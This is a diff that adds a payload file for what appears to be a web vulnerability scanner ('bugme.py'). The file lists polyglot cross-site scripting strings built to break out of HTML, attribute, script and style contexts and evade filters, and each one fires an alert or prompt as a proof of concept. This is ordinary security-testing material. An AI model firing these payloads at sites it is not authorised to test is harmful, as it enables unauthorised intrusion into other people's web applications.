@@ -1,0 +1,35 @@
+# Polyglot XSS Payloads (Work in Multiple Contexts)
+# Use with: python bugme.py -u "URL" --payloads payloads/polyglot.txt
+
+# Short polyglots
+'"><img src=x onerror=alert(1)>
+'"><script>alert(1)</script>
+'"><svg onload=alert(1)>
+
+# Medium polyglots
+'">><marquee><img src=x onerror=alert(1)></marquee>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+'">><script>alert(1)</script><img src=x onerror=alert(1)>
+
+# Advanced polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Super polyglot
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
+
+# Context-agnostic
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+</script><svg/onload=alert(1)>
+</style><svg/onload=alert(1)>
+
+# Multi-browser polyglot
+'"><img src=x onerror=alert(1) style=x:expression(alert(1))>
+'"><script>alert(1)</script><img src=x onerror=alert(1)>
+
+# Universal polyglot
+';alert(1);//
+";alert(1);//
+javascript:alert(1)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
